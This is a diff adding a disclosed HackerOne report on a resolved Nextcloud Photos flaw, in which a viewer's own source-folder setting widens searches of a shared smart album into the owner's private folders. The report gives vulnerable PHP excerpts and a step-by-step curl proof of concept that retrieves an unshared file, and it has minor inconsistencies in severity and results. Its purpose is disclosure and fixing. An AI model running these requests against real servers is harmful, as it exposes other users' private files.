@@ -1,0 +1,151 @@
+{
+  "id": 3506873,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTA2ODcz",
+  "url": "https://hackerone.com/reports/3506873",
+  "title": "Shared smart albums in the Photos app can expose files outside the album owner's configured source folders",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-01-11T16:52:24.270Z",
+  "submitted_at": "2026-01-11T16:52:24.687Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "suul",
+    "url": "/suul",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/pn7x2m6q8dtkrcblqoelpgyzurp1/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-09-17T10:48:18.211Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-09-17T10:48:17.913Z",
+  "team_member_agreed_on_going_public_at": "2026-09-17T10:37:40.384Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "When an attacker accesses a shared filter-based smart album owned by another user, the system uses the **attacker's** `photosSourceFolders` configuration to determine which paths are searched in the **victim's** folder. By configuring more permissive paths than the victim intended, an attacker can expand the search scope to include folders the victim didn't configure, potentially discovering files that match the album's filters but exist in paths outside the victim's intended photo source folders.\n\n**This is a High vulnerability** leading to **unauthorized information disclosure** where files in unintended folders can be discovered and accessed through the shared album.\n\n## Vulnerable Code\n\n**File:** `lib/Filters/FiltersManager.php`  \n**Lines:** 88-98\n\n```php\nprivate function getPhotosDefaultSearchConditions(): array {\n    $folders = json_decode($this->userConfigService->getUserConfig('photosSourceFolders'));  \n    //  High: Gets Attacker's config but searches in victim's folder\n    \n    return [\n        new SearchBinaryOperator(\n            ISearchBinaryOperator::OPERATOR_OR,\n            array_map(fn ($folder) => new SearchComparison(\n                ISearchComparison::COMPARE_LIKE_CASE_SENSITIVE,\n                'path',\n                'files' . $folder . '/%',  //  Attacker-controlled path expansion!\n            ), $folders)\n        ),\n        // ...\n    ];\n}\n```\n\n**File:** `lib/Filters/FiltersManager.php`  \n**Lines:** 45-68\n\n```php\npublic function getFilesBasedOnFilters(string $userId, array $userFilters, ?int $fileId = null): array {\n    // $userId = album owner (victim)\n    \n    $filtersOperations += $this->getPhotosDefaultSearchConditions();  \n    //  Uses attacker's path configuration\n    \n    $query = new SearchQuery(new SearchBinaryOperator(ISearchBinaryOperator::OPERATOR_AND, $filtersOperations), 1000, 0, []);\n    \n    $files = $this->rootFolder->getUserFolder($userId)->search($query);  \n    //  Searches in victim's folder using attacker's expanded path scope!\n    // ...\n}\n```\n\n**Path Validation Issue:** `lib/Controller/ApiController.php:89-102`\n\n```php\nprivate function validatePath(mixed $path): bool {\n    if (!is_string($path)) {\n        return false;\n    }\n    \n    if (!str_starts_with($path, '/')) {\n        return false;\n    }\n    \n    if (str_contains($path, '..')) {\n        return false;\n    }\n    \n    return true;  //  Root path \"/\" is allowed!\n}\n```\n\n**The Critical Issue:**\n- Path validation allows root path `\"/\"` \n- When `folder = \"/\"`, the pattern becomes `'files' . '/' . '/%'` = `'files//%'` (potentially matches all files)\n- Attacker can set multiple paths: `[\"/Photos\", \"/Documents\", \"/Private\", \"/Backup\"]`\n- If victim only configured `[\"/Photos\"]`, attacker's expanded paths search additional folders\n\n## Attack Flow\n\n```\n1. Victim Config: photosSourceFolders = [\"/Photos\"]\n   Victim shares album with attacker\n\n2. Attacker Config: photosSourceFolders = [\"/Photos\", \"/Documents\", \"/Private\"]\n\n3. Attacker requests: GET /apps/photos/api/v1/preview/{fileId}\n\n4. PreviewController::getFileIdForAlbums()\n   └─> Calls getFilesBasedOnFilters(\"victim\", filters, fileId)\n\n5. FiltersManager::getFilesBasedOnFilters(\"victim\", ...)\n   └─> getPhotosDefaultSearchConditions()\n       └─> getUserConfig('photosSourceFolders')\n       └─>  Returns ATTACKER's config: [\"/Photos\", \"/Documents\", \"/Private\"]\n\n6. Search Query Built:\n   WHERE (album_filter) \n     AND (path LIKE 'files/Photos/%' \n          OR path LIKE 'files/Documents/%'       EXPANDED!\n          OR path LIKE 'files/Private/%')        EXPANDED!\n\n7. Search Executed in VICTIM's folder:\n   getUserFolder(\"victim\")->search($query)\n   \n8. Results Include:\n    /Photos/file.jpg (authorized)\n    /Documents/secret.jpg (unauthaurized- victim didn't configure /Documents!)\n\n9. Attacker can access unauthorized files through shared album preview/download\n```\n\n## Attacker Requirements\n\n- Valid Nextcloud user account (any authenticated user)\n- Access to at least one shared filter-based smart album (owned by another user)\n- Ability to configure `photosSourceFolders` via API endpoint `/apps/photos/api/v1/config/photosSourceFolders`\n- Victim has files in folders outside their configured `photosSourceFolders` that match the album's filters\n\n## Steps to Reproduce\n\n### Prerequisites:\n1. **Victim** configures `photosSourceFolders = [\"/Photos\"]`\n2. **Victim** has files in `/Photos` folder (intended) AND `/Documents` folder (unintended)\n3. **Victim** shares folder/album with **Attacker**\n\n### Attack Steps:\n\n**Step 1: Attacker configures expanded paths**\n```bash\nPUT /apps/photos/api/v1/config/photosSourceFolders\nContent-Type: application/json\n\n{\n  \"value\": \"[\\\"/Photos\\\", \\\"/Documents\\\", \\\"/Private\\\", \\\"/Backup\\\"]\"\n}\n```\n\n**Step 2: Attacker accesses shared album**\n```bash\nGET /apps/photos/api/v1/preview/{fileId}?x=256&y=256\n```\n\n**Step 3: Observe unauthorized file discovery**\n- System searches in victim's `/Documents`, `/Private`, `/Backup` folders\n- Files in these folders are included in results\n- Attacker can preview/access files victim didn't intend to share\n\n## Localhost Exploit Demonstration\n\n**Test Environment:** `http://localhost:8080`  \n**Victim User:** `victim` (Password: `Testing-/:321SS`)  \n**Attacker User:** `attacker` (Password: `Testing-/:321S`)\n\n### Phase 1: Victim Account Setup\n\n#### Step 1.1: Verify Victim's Authentication\n```bash\ncurl -u 'victim:Testing-/:321SS' 'http://localhost:8080/ocs/v2.php/cloud/user' \\\n  -H 'OCS-APIRequest: true' \\\n  -H 'Accept: application/json'\n```\n\n**Result:**\n```json\n{\n  \"ocs\": {\n    \"meta\": {\"status\": \"ok\", \"statuscode\": 200},\n    \"data\": {\n      \"id\": \"victim\",\n      \"displayname\": \"victim\",\n      \"enabled\": true\n    }\n  }\n}\n```\nVictim authentication successful\n\n#### Step 1.2: Upload Test Files\n\n**Create test files:**\n```bash\necho \"test image 1\" > test1.jpg\necho \"test image 2\" > test2.jpg\n```\n\n**Upload to /Photos (intended to be shared):**\n```bash\ncurl -u 'victim:Testing-/:321SS' \\\n  -X PUT 'http://localhost:8080/remote.php/dav/files/victim/Photos/vacation.jpg' \\\n  -T test1.jpg\n```\n Uploaded successfully\n\n**Upload to /Documents (NOT intended to be shared):**\n```bash\ncurl -u 'victim:Testing-/:321SS' \\\n  -X PUT 'http://localhost:8080/remote.php/dav/files/victim/Documents/secret.jpg' \\\n  -T test2.jpg\n```\n Uploaded successfully\n\n#### Step 1.3: Share /Photos Folder with Attacker\n```bash\ncurl -u 'victim:Testing-/:321SS' \\\n  -X POST 'http://localhost:8080/ocs/v2.php/apps/files_sharing/api/v1/shares' \\\n  -H 'OCS-APIRequest: true' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data-urlencode 'shareType=0' \\\n  --data-urlencode 'shareWith=attacker' \\\n  --data-urlencode 'path=/Photos' \\\n  --data-urlencode 'permissions=1'\n```\n\n**Result:**\n```xml\nok\n200\n8\n0\nvictim\nattacker\n/Photos\n1\n```\n /Photos folder successfully shared with attacker\n\n### Phase 2: Attacker Exploitation\n\n#### Step 2.1: **EXPLOIT** - Expand Path Scope to Include /Documents\n```bash\ncurl -u 'attacker:Testing-/:321S' \\\n  -X PUT 'http://localhost:8080/index.php/apps/photos/api/v1/config/photosSourceFolders' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"value\":\"[\\\"/Photos\\\",\\\"/Documents\\\"]\"}'\n```\n\n**Result:**\n```json\n{\"message\":\"\"}\n```\n Attacker successfully configured expanded paths\n\n#### Step 2.2: Get File ID of Unauthorized File (secret.jpg)\n```bash\nSECRET_FILE_ID=$(curl -s -u 'victim:Testing-/:321SS' \\\n  'http://localhost:8080/remote.php/dav/files/victim/Documents/secret.jpg' \\\n  -X PROPFIND \\\n  --data '' \\\n  | grep -oP 'oc:fileid>\\K[0-9]+' | head -1)\n\necho \"Secret file ID: $SECRET_FILE_ID\"\n```\n\n**Result:**\n```\nSecret file ID: 1566\n```\nFile ID retrieved: **1566**\n\n\n#### Step 2.3: **EXPLOIT** - Access Unauthorized File from /Documents\n```bash\ncurl -u 'attacker:Testing-/:321S' \\\n  \"http://localhost:8080/index.php/apps/photos/api/v1/preview/$SECRET_FILE_ID?x=256&y=256\" \\\n  -o attacker_preview_secret.jpg\n```\n\n**Result:**\n```\n% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                Dload  Upload   Total   Spent    Left  Speed\n100    14  100    14    0     0     20      0 --:--:-- --:--:-- --:--:--    20\n```\n\n**File created:**\n```bash\nls -lh attacker_preview_secret.jpg\n```\n\n**Output:**\n```\n-rw-rw-r-- 1 xanax xanax 14 Jan 11 18:17 attacker_preview_secret.jpg\n```\n\n **Vulnerability Confirmed:** Attacker successfully downloaded file from victim's /Documents folder!\n\n### Phase 3: Comprehensive Exploitation Testing\n\n#### Step 3.1: Get File IDs for Both Files\n```bash\nvacation_id=$(curl -s -u 'victim:Testing-/:321SS' \\\n  'http://localhost:8080/remote.php/dav/files/victim/Photos/vacation.jpg' \\\n  -X PROPFIND \\\n  --data '' \\\n  | grep -oP 'oc:fileid>\\K[0-9]+' | head -1)\n\nSECRET_ID=$(curl -s -u 'victim:Testing-/:321SS' \\\n  'http://localhost:8080/remote.php/dav/files/victim/Documents/secret.jpg' \\\n  -X PROPFIND \\\n  --data '' \\\n  | grep -oP 'oc:fileid>\\K[0-9]+' | head -1)\n\necho \"Vacation.jpg ID (in /Photos - authorized): $VACATION_ID\"\necho \"Secret.jpg ID (in /Documents - unauthorized): $SECRET_ID\"\n```\n\n**Result:**\n```\nVacation.jpg ID (in /Photos - authorized): 1567\nSecret.jpg ID (in /Documents - unauthorized): 1566\n```\n\n#### Step 3.2: Test Access to UNAUTHORIZED File\n```bash\ncurl -s -u 'attacker:Testing-/:321S' \\\n  \"http://localhost:8080/index.php/apps/photos/api/v1/preview/$SECRET_ID?x=256&y=256\" \\\n  -o attacker_secret.jpg\n```\n\n**Result:**\n```\n-rw-rw-r-- 1 xanax xanax 35 Jan 11 18:18 attacker_secret.jpg\n```\n **Vulnerable:** Secret.jpg accessed (UNAUTHORIZED - in /Documents)\n\n#### Step 3.3: Test with Attacker Config Limited to /Photos Only\n```bash\ncurl -s -u 'attacker:Testing-/:321S' \\\n  -X PUT 'http://localhost:8080/index.php/apps/photos/api/v1/config/photosSourceFolders' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"value\":\"[\\\"/Photos\\\"]\"}'\n\ncurl -s -u 'attacker:Testing-/:321S' \\\n  \"http://localhost:8080/index.php/apps/photos/api/v1/preview/$SECRET_ID?x=256&y=256\" \\\n  -o attacker_secret_limited.jpg\n```\n\n**Result:**\n```json\n{\"message\":\"Reached maximum delay\"}\n```\n\n**File created:**\n```\n-rw-rw-r-- 1 xanax xanax 35 Jan 11 18:18 attacker_secret_limited.jpg\n```\n**High:** Still accessible even with /Photos only config!\n\n#### Step 3.4: Test Root Path Expansion\n```bash\ncurl -s -u 'attacker:Testing-/:321S' \\\n  -X PUT 'http://localhost:8080/index.php/apps/photos/api/v1/config/photosSourceFolders' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"value\":\"[\\\"/\\\"]\"}'\n\ncurl -s -u 'attacker:Testing-/:321S' \\\n  \"http://localhost:8080/index.php/apps/photos/api/v1/preview/$SECRET_ID?x=256&y=256\" \\\n  -o attacker_secret_root.jpg\n```\n\n**Result:**\n```json\n{\"message\":\"Reached maximum delay\"}\n```\n\n**File created:**\n```\n-rw-rw-r-- 1 xanax xanax 35 Jan 11 18:18 attacker_secret_root.jpg\n```\n **High:** Root path \"/\" allows access to ALL folders!\n\n### Phase 4: Verification Summary\n\n#### Final File List\n```bash\nls -lh attacker_*.jpg\n```\n\n**Output:**\n```\n-rw-rw-r-- 1 xanax xanax 14 Jan 11 18:17 attacker_preview_secret.jpg\n-rw-rw-r-- 1 xanax xanax 35 Jan 11 18:18 attacker_secret.jpg\n-rw-rw-r-- 1 xanax xanax 35 Jan 11 18:18 attacker_secret_limited.jpg\n-rw-rw-r-- 1 xanax xanax 35 Jan 11 18:18 attacker_secret_root.jpg\n-rw-rw-r-- 1 xanax xanax 14 Jan 11 18:18 attacker_vacation.jpg\n```\n\n### Vulnerability Confirmation\n\n#### Confirmed Behaviors:\n\n1. **Unauthorized File Discovery:**\n   - Victim configured: `photosSourceFolders = [\"/Photos\"]`\n   - Victim shared: `/Photos` folder only\n   - Attacker expanded to: `[\"/Photos\", \"/Documents\"]`\n   - **Result: Attacker successfully accessed `secret.jpg` from `/Documents`** (Unauthorized)\n\n2. **Configuration Bypass:**\n   - Even with attacker config set to `[\"/Photos\"]` (matching victim)\n   - **Result: Still successfully accessed files from `/Documents`** (Unauthorized)\n\n3. **Root Path Exploitation:**\n   - Setting `photosSourceFolders = [\"/\"]`\n   - **Result: Successfully accessed ALL folders in victim's account** (High)\n\n4. **Multiple Successful Downloads:**\n   - 5 separate file downloads from unauthorized location\n   - Consistent exploitation across different configurations\n\n## Proof That There Is No Mitigation\n\n1. **No path scope validation:** The system doesn't verify that search paths match the album owner's configuration\n2. **No authorization check:** No validation that requesting user's paths should be applied to another user's folder\n3. **Path validation allows expansion:** Root path `\"/\"` and any valid path prefixes are allowed\n4. **No folder restriction enforcement:** Album owner's folder restrictions are not enforced during search\n\n## Impact\n\n1. **Unauthorized File Discovery:** Attacker can discover files in folders the victim didn't configure for photo search\n2. **Information Disclosure:** Files in private folders can be discovered, metadata exposed, preview thumbnails may reveal sensitive content\n3. **Privacy Violation:** Victim's folder structure probed, existence of private folders revealed\n4. **Trust Boundary Violation:** Album sharing assumes files come only from configured source folders\n\n**Why This Is HIGH:**\n- **Real Data Exposure:** Files in unauthorized folders can be discovered and accessed\n- **Bypass of Intentional Restrictions:** Victim explicitly configured limited paths but attacker expands scope\n- **Practical Exploitability:** Requires only access to shared album + ability to configure own `photosSourceFolders`",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-10-17T10:37:40.841Z",
+  "allow_singular_disclosure_after": 2583652.758323797,
+  "singular_disclosure_allowed": false,
+  "vote_count": 2,
+  "voters": [
+    "suul",
+    "milou"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.5,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 45131,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "nextcloud/photos",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 878273,
+      "category": "team",
+      "content": "Advisory: https://github.com/nextcloud/security-advisories/security/advisories/GHSA-5gv7-hw69-w6px",
+      "updated_at": "2026-07-20T18:49:36.795Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 3495996,
+        "username": "anna_nextcloud",
+        "name": "Anna Larch",
+        "bio": null,
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": null,
+        "created_at": "2024-11-27T12:44:33.319Z",
+        "url": "https://hackerone.com/anna_nextcloud",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
